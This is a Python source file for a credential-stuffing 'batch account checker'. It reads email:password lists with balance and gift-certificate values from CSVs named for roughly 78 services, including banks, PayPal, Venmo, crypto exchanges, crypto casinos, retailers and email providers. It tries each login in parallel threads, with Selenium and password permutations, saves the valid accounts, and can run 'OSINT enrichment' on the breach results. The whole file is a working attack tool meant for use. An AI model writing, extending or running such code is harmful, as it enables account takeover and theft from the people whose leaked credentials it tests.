#!/usr/bin/env python3
"""
Batch Account Checker - Process all CSV files against all services
Ultra-fast with parallel processing and smart routing
"""

import csv
import time
import concurrent.futures
from pathlib import Path
from typing import List, Dict
from dataclasses import dataclass
from datetime import datetime
import json


@dataclass
class BatchCredential:
    """Credential with metadata."""
    email: str
    password: str
    balance: str
    certificate_value: str
    source_file: str


class BatchChecker:
    """High-speed batch account checker."""

    def __init__(self, max_workers: int = 20, use_permutations: bool = True):
        self.max_workers = max_workers
        self.use_permutations = use_permutations
        self.results = []

        # Service routing based on filename (78 services)
        self.service_mapping = {
            # Tested & Validated
            'alta.csv': 'alta', 'amc.csv': 'amc', 'ebth.csv': 'ebth',
            'fandango.csv': 'fandango', 'gamestop.csv': 'gamestop',
            'marriott.csv': 'marriott', 'nike.csv': 'nike',
            'sephora.csv': 'sephora', 'panda.csv': 'panda',
            'frontier.csv': 'frontier', 'fresh.csv': 'fresh',
            # Retail & Services
            'dsw.csv': 'dsw', 'amazon.csv': 'amazon',
            'walmart.csv': 'walmart', 'target.csv': 'target',
            'bestbuy.csv': 'bestbuy', 'ebay.csv': 'ebay',
            # Food & Restaurants
            'subway.csv': 'subway', 'roundtable.csv': 'roundtable',
            'pizzahut.csv': 'pizzahut', 'dominoes.csv': 'dominoes',
            'burgerking.csv': 'burgerking',
            # Email Providers
            'gmail.csv': 'gmail', 'hotmail.csv': 'hotmail',
            'yahoo.csv': 'yahoo', 'icloud.csv': 'icloud',
            'outlook.csv': 'outlook', 'protonmail.csv': 'protonmail',
            'aol.csv': 'aol',
            # Payment & Banking
            'paypal.csv': 'paypal', 'venmo.csv': 'venmo',
            'cashapp.csv': 'cashapp', 'zelle.csv': 'zelle',
            'stripe.csv': 'stripe', 'chime.csv': 'chime',
            'navyfederal.csv': 'navyfederal', 'usaa.csv': 'usaa',
            'regents.csv': 'regents', 'cwallet.csv': 'cwallet',
            'wellsfargo.csv': 'wellsfargo',
            'bankofamerica.csv': 'bankofamerica',
            'chase.csv': 'chase',
            # Social Media
            'facebook.csv': 'facebook', 'instagram.csv': 'instagram',
            'twitter.csv': 'twitter', 'x.csv': 'x',
            'linkedin.csv': 'linkedin', 'tiktok.csv': 'tiktok',
            'snapchat.csv': 'snapchat', 'reddit.csv': 'reddit',
            'discord.csv': 'discord', 'telegram.csv': 'telegram',
            # Telecom/ISP
            'xfinity.csv': 'xfinity', 'att.csv': 'att',
            'verizon.csv': 'verizon', 'tmobile.csv': 'tmobile',
            'sprint.csv': 'sprint', 'total.csv': 'total',
            'simpletalk.csv': 'simpletalk', 'cricket.csv': 'cricket',
            'boost.csv': 'boost', 'metrobymetro.csv': 'metrobymetro',
            # Airlines/Travel
            'frontierairlines.csv': 'frontierairlines',
            'southwest.csv': 'southwest', 'delta.csv': 'delta',
            'united.csv': 'united', 'american.csv': 'american',
            # Gaming/Streaming
            'steam.csv': 'steam', 'epic.csv': 'epic',
            'origin.csv': 'origin', 'battlenet.csv': 'battlenet',
            'xbox.csv': 'xbox', 'playstation.csv': 'playstation',
            'netflix.csv': 'netflix', 'hulu.csv': 'hulu',
            'disney.csv': 'disney', 'spotify.csv': 'spotify',
            # Cloud Storage
            'dropbox.csv': 'dropbox', 'googledrive.csv': 'googledrive',
            'onedrive.csv': 'onedrive',
            'icloud_storage.csv': 'icloud_storage',
            # Gaming Services
            'riot.csv': 'riot', 'jagex.csv': 'jagex',
            'rockstargames.csv': 'rockstargames', 'ubisoft.csv': 'ubisoft',
            'twitch.csv': 'twitch', 'youtube.csv': 'youtube',
            # Crypto Casinos (HIGH VALUE)
            'stake_com.csv': 'stake_com', 'stake_us.csv': 'stake_us',
            'roobet.csv': 'roobet', 'rollbit.csv': 'rollbit',
            'shuffle.csv': 'shuffle', 'duelbits.csv': 'duelbits',
            'csgoempire.csv': 'csgoempire', 'csgolotto.csv': 'csgolotto',
            # Crypto Exchanges (CRITICAL)
            'binance.csv': 'binance', 'coinbase.csv': 'coinbase',
            'kraken.csv': 'kraken',
        }

        # Services requiring Selenium
        self.selenium_services = {
            'gamestop', 'amc', 'fandango', 'ebth'
        }

    def load_all_credentials(self, directory: str = '.') -> Dict[str, List[BatchCredential]]:
        """Load credentials from all CSV files."""
        credentials_by_service = {}
        directory_path = Path(directory)

        print("[*] Scanning for CSV files...")

        for csv_file in directory_path.glob('*.csv'):
            if csv_file.name.startswith('result-'):
                continue  # Skip result files

            service = self.service_mapping.get(csv_file.name, 'unknown')
            credentials = []

            with open(csv_file, 'r', encoding='utf-8') as f:
                for i, line in enumerate(f, 1):
                    if i == 1:  # Skip header
                        continue

                    line = line.strip()
                    if not line:
                        continue

                    # Parse: email:password | Balance = X | CertificateValue = Y
                    parts = line.split('|')
                    if len(parts) >= 1:
                        cred_part = parts[0].strip()
                        if ':' in cred_part:
                            email, password = cred_part.split(':', 1)

                            # Extract balance and certificate
                            balance = "0"
                            cert_value = "0"
                            for part in parts[1:]:
                                if 'Balance' in part:
                                    try:
                                        balance = part.split('=')[1].strip()
                                    except:
                                        pass
                                if 'CertificateValue' in part:
                                    try:
                                        cert_value = part.split('=')[1].strip()
                                    except:
                                        pass

                            if '@' in email:
                                credentials.append(BatchCredential(
                                    email=email.strip(),
                                    password=password.strip(),
                                    balance=balance,
                                    certificate_value=cert_value,
                                    source_file=csv_file.name
                                ))

            if credentials:
                credentials_by_service[service] = credentials
                print(f"  ✓ {csv_file.name}: {len(credentials)} accounts ({service})")

        return credentials_by_service

    def check_single_account(self, credential: BatchCredential,
                            service: str) -> Dict:
        """Check a single account (routing to appropriate checker)."""
        try:
            if service in self.selenium_services:
                # Use Selenium for complex sites
                from selenium_checker import check_account_selenium
                result = check_account_selenium(
                    credential.email,
                    credential.password,
                    service,
                    headless=True
                )
                return {
                    'email': credential.email,
                    'password': credential.password,
                    'service': service,
                    'status': 'valid' if result.success else 'invalid',
                    'balance': result.balance or credential.balance,
                    'points': result.points,
                    'error': result.error,
                    'source_file': credential.source_file
                }
            else:
                # Use fast HTTP-based checker
                from account_checker import AccountCheckerEngine
                engine = AccountCheckerEngine(
                    max_workers=1,
                    use_permutations=self.use_permutations
                )

                # Convert to Credential object
                from account_checker import Credential
                cred = Credential(
                    email=credential.email,
                    password=credential.password,
                    balance=credential.balance,
                    certificate_value=credential.certificate_value
                )

                result = engine.check_credential(cred, service)

                return {
                    'email': credential.email,
                    'password': credential.password,
                    'service': service,
                    'status': result.status,
                    'balance': result.balance or credential.balance,
                    'certificate_value': credential.certificate_value,
                    'permutation_used': result.permutation_used,
                    'source_file': credential.source_file
                }

        except Exception as e:
            return {
                'email': credential.email,
                'password': credential.password,
                'service': service,
                'status': 'error',
                'error': str(e),
                'source_file': credential.source_file
            }

    def process_service_batch(self, service: str,
                             credentials: List[BatchCredential]) -> List[Dict]:
        """Process all accounts for a service with parallel execution."""
        print(f"\n{'='*70}")
        print(f"Processing: {service.upper()}")
        print(f"Accounts: {len(credentials)}")
        print(f"Threads: {self.max_workers}")
        print(f"{'='*70}\n")

        results = []
        start_time = time.time()

        # Reduce workers for Selenium (resource intensive)
        workers = 3 if service in self.selenium_services else self.max_workers

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {
                executor.submit(
                    self.check_single_account, cred, service
                ): cred for cred in credentials
            }

            completed = 0
            total = len(credentials)

            for future in concurrent.futures.as_completed(futures):
                completed += 1
                result = future.result()
                results.append(result)

                # Progress indicator
                status = result['status']
                symbol = "✓" if status == 'valid' else "✗"
                perm_info = ""
                if result.get('permutation_used'):
                    perm_info = f" [password variant used]"

                print(f"[{completed}/{total}] {symbol} {result['email'][:30]:30} "
                      f"| {status:8}{perm_info}")

        elapsed = time.time() - start_time

        # Summary
        valid = sum(1 for r in results if r['status'] == 'valid')
        invalid = sum(1 for r in results if r['status'] == 'invalid')
        errors = sum(1 for r in results if r['status'] == 'error')

        print(f"\n{service.upper()} Summary:")
        print(f"  ✓ Valid: {valid}")
        print(f"  ✗ Invalid: {invalid}")
        print(f"  ⚠ Errors: {errors}")
        print(f"  ⏱ Time: {elapsed:.2f}s ({total/elapsed:.2f} checks/sec)")

        return results

    def save_results(self, results: List[Dict], output_dir: str = '.'):
        """Save results by service."""
        output_path = Path(output_dir)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Group by service
        by_service = {}
        for result in results:
            service = result['service']
            if service not in by_service:
                by_service[service] = []
            by_service[service].append(result)

        # Save each service
        for service, service_results in by_service.items():
            output_file = output_path / f"checked-{service}-{timestamp}.csv"

            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                fieldnames = [
                    'email', 'password', 'status', 'balance',
                    'points', 'certificate_value', 'permutation_used',
                    'error', 'source_file'
                ]
                writer = csv.DictWriter(f, fieldnames=fieldnames,
                                       extrasaction='ignore')
                writer.writeheader()
                writer.writerows(service_results)

            valid_count = sum(1 for r in service_results if r['status'] == 'valid')
            print(f"  ✓ {output_file.name} ({valid_count} valid accounts)")

        # Save combined results
        combined_file = output_path / f"checked-all-{timestamp}.csv"
        with open(combined_file, 'w', newline='', encoding='utf-8') as f:
            fieldnames = [
                'service', 'email', 'password', 'status', 'balance',
                'points', 'certificate_value', 'permutation_used',
                'error', 'source_file'
            ]
            writer = csv.DictWriter(f, fieldnames=fieldnames,
                                   extrasaction='ignore')
            writer.writeheader()
            writer.writerows(results)

        print(f"  ✓ {combined_file.name} (combined results)")

        # Save statistics
        stats_file = output_path / f"stats-{timestamp}.json"
        stats = {
            'timestamp': timestamp,
            'total_checked': len(results),
            'total_valid': sum(1 for r in results if r['status'] == 'valid'),
            'total_invalid': sum(1 for r in results if r['status'] == 'invalid'),
            'total_errors': sum(1 for r in results if r['status'] == 'error'),
            'by_service': {}
        }

        for service, service_results in by_service.items():
            stats['by_service'][service] = {
                'total': len(service_results),
                'valid': sum(1 for r in service_results if r['status'] == 'valid'),
                'invalid': sum(1 for r in service_results if r['status'] == 'invalid'),
                'errors': sum(1 for r in service_results if r['status'] == 'error')
            }

        with open(stats_file, 'w') as f:
            json.dump(stats, f, indent=2)

        print(f"  ✓ {stats_file.name} (statistics)")


def main():
    """Main batch processing."""
    import argparse

    parser = argparse.ArgumentParser(
        description='Batch Account Checker - Process all CSV files (78 services)'
    )
    parser.add_argument('-d', '--directory', default='input_data',
                       help='Directory containing CSV files (default: input_data)')
    parser.add_argument('-t', '--threads', type=int, default=20,
                       help='Number of threads (default: 20)')
    parser.add_argument('--no-permutations', action='store_true',
                       help='Disable password permutations')
    parser.add_argument('-s', '--service', help='Check only specific service')
    parser.add_argument('--with-osint', action='store_true',
                       help='Run OSINT enrichment after checking')
    parser.add_argument('--with-analysis', action='store_true',
                       help='Run analysis tools after checking')

    args = parser.parse_args()

    print("="*70)
    print(" BATCH ACCOUNT CHECKER ".center(70, '='))
    print("="*70)

    # Initialize
    checker = BatchChecker(
        max_workers=args.threads,
        use_permutations=not args.no_permutations
    )

    # Load credentials
    credentials_by_service = checker.load_all_credentials(args.directory)

    if not credentials_by_service:
        print("\n[!] No credentials found!")
        return

    print(f"\n[*] Total services: {len(credentials_by_service)}")
    print(f"[*] Total accounts: {sum(len(c) for c in credentials_by_service.values())}")

    # Process
    all_results = []
    overall_start = time.time()

    for service, credentials in credentials_by_service.items():
        if args.service and service != args.service:
            continue

        results = checker.process_service_batch(service, credentials)
        all_results.extend(results)

    overall_elapsed = time.time() - overall_start

    # Final summary
    print(f"\n{'='*70}")
    print(" FINAL SUMMARY ".center(70, '='))
    print(f"{'='*70}")
    print(f"Total Checked: {len(all_results)}")
    print(f"Total Valid: {sum(1 for r in all_results if r['status'] == 'valid')}")
    print(f"Total Invalid: {sum(1 for r in all_results if r['status'] == 'invalid')}")
    print(f"Total Errors: {sum(1 for r in all_results if r['status'] == 'error')}")
    print(f"Total Time: {overall_elapsed:.2f}s")
    print(f"{'='*70}\n")

    # Save results
    print("[*] Saving results...")
    checker.save_results(all_results, args.directory)

    # Optional: Run OSINT enrichment
    if args.with_osint:
        print("\n[*] Running OSINT enrichment...")
        try:
            from osint_enrichment import enrich_breach_results
            enrich_breach_results(Path(args.directory))
        except Exception as e:
            print(f"[!] OSINT enrichment failed: {e}")

    # Optional: Run analysis
    if args.with_analysis:
        print("\n[*] Running analysis tools...")
        try:
            from analyze_results import analyze_breaches
            from domain_intel import analyze_domain_distribution
            from master_report import generate_master_report

            analyze_breaches()
            analyze_domain_distribution()
            generate_master_report()
        except Exception as e:
            print(f"[!] Analysis failed: {e}")

    print("\n[✓] Batch processing complete!")
    print("\n[*] Next steps:")
    print("    - Review results in checked-*.csv files")
    print("    - Run: python analyze_results.py")
    print("    - Run: python domain_intel.py")
    print("    - Run: python osint_enrichment.py")
    print("    - Run: python master_report.py")


if __name__ == '__main__':
    main()
